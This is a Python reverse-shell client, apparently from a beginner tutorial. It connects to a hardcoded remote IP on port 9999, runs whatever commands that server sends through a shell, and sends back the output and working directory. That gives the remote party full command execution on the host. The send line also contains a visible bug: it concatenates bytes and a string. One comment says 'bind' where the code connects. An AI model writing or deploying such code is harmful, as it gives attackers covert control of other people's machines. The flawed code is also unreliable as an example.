import socket
import os    #stands for Operating System
import subprocess     # make the instruction necessary for the client in order to make the connection

s = socket.socket()
host = '198.168.133.85'           #ip address of the server
port = 9999

# Bind the port and the host together which is a little different with what happened in the server side
s.connect((host, port))



while True:
    data = s.recv(1024)    # data received from the server side with the "buffer size = 1024"
    if data[:2].decode("utf-8") == "cd":
        os.chdir(data[3:].decode("utf-8"))

    if len(data)>0:
        cmd = subprocess.Popen(data[:].decode("utf-8"), shell =True, stdout= subprocess.PIPE, stdin=subprocess.PIPE, stderr=subprocess.PIPE)
        output_byte = cmd.stdout.read() + cmd.stderr.read()
        output_str = str(output_byte, "utf-8")
        currentWD = os.getcwd()+">"    # This the line which shows the current working directory
        s.send(str.encode(output_str) + currentWD)

        print(output_str)



